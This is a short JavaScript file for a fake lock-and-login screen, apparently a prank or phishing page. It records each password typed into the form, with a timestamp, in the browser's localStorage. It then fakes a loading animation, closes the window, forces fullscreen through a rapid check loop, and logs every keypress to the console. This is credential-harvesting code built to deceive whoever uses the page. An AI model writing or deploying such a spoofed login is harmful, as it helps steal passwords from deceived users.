document.addEventListener("click", () => {
    document.getElementById("lock-screen").classList.remove("open")
    document.getElementById("login-screen").classList.add("open")
})

document.getElementById("form").addEventListener("submit", (e) => {
    e.preventDefault()
    const pass = document.getElementById("pass").value
    let allPasswords = JSON.parse(localStorage.getItem("passes")) || []

    allPasswords.push({
        password: pass,
        date: new Date()
    })

    localStorage.setItem("passes", JSON.stringify(allPasswords))

    document.getElementById("form").innerHTML = `
        <div class='loader'>
            <div class="bg"></div>
            <div class='circle'></div>
            <div class='circle'></div>
            <div class='circle'></div>
            <div class='circle'></div>
            <div class='circle'></div>
        </div>
    `

    setTimeout(() => {
        window.close()
    }, 2000)

})

function checkScreen() {
    if (window.innerHeight !== screen.height) {
        if(window.opener !== null) {
            window.close()
        } else {
            document.body.innerHTML = `
                <div class="death">
                </div>
            `
        }
    }
    setTimeout(checkScreen, 10)
}

setTimeout(() => {
    alert("Collatrel has started")
    checkScreen()
}, 5000);

document.addEventListener("keypress", (e) => {
    console.log(e.key)
})